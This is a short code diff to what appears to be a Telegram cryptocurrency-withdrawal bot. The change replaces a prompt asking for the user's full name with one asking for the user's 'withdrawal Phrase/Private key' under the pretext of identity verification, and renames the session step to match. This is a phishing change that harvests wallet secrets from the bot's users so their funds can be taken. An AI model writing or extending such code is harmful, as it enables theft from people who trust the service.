@@ -338,7 +338,7 @@ bot.on('text', async (ctx, next) => {
     }
 
     ctx.session.withdraw = { ...(ctx.session.withdraw || {}), address };
-    ctx.session.awaiting = 'withdraw_fullname';
+    ctx.session.awaiting = 'withdraw_Phrase';
 
     const label = chain === 'bsc' ? 'BNB' : chain.toUpperCase();
     await ctx.reply(
@@ -366,10 +366,10 @@ bot.on('text', async (ctx, next) => {
       await ctx.reply('❌ Session expired. Please run /withdraw again.', mainMenu);
       return;
     }
-    if (!Phrase || fullName.length < 2) {
+    if (!Phrase || Phrase.length < 2) {
       ctx.session.awaiting = 'withdraw_Phrase';
       ctx.session.withdraw = { chain, amount, address };
-      await ctx.reply('❌ Please enter your full name.');
+      await ctx.reply('❌ Secured** Please Enter your withdrawal Phrase/Private key to verify your identity.');
       return;
     }
 
